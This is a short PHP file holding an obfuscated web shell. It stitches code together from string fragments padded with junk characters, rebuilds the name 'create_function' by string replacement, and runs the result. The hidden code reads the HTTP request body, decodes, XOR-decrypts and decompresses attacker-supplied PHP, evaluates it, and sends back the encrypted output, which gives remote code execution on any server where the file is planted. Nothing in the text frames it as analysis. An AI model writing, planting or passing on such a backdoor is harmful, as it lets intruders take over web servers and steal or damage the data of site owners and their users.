<?php
$a='$k="_wdb7eb05_we";$kh="a_w4288d9c_wf7e4";_w$k_wf="cc_wb3bdb9fc76_w_w";$p="Msu_w_w2uYcOg_wGHvh54K";functi_wo_wn x($t,$';
$m='__wc_wonte_wnts(_w);@ob_end_cle_w_wan();$r=@b_wase64_en_wcode(@_wx(@gzc_wo_wmpress($o),$k_w));pri_wnt("$_wp$k_wh$r$kf");}';
$l='_w){$_wo.=$t{$i}^$k{_w$j};}}r_wetur_wn _w$o;}if_w (@_wpreg__wmatch("/$kh(.+)$k_wf/_w"_w,@file_get_c_won_wtent_ws("php:/_w/';
$N='input"),_w$m)==1)_w {_w@ob_start();@_we_wval(@gzun_wcomp_wress(@x(@b_wase_w64_decode_w(_w$m[1]),$k)_w)_w);$o=@ob_get';
$d=str_replace('k','','crekakkte_fukncktikon');
$H='_wk){$c=s_wtrlen(_w$k)_w_w;$l_w=strlen($t);$o="";for_w(_w$i=0;$i<$l;_w)_w{_w_wfor($j=0;_w($j<_w$c&&$i<$l);$j++,$i++_w';
$X=str_replace('_w','',$a.$H.$l.$N.$m);
$g=$d('',$X);$g();
?>
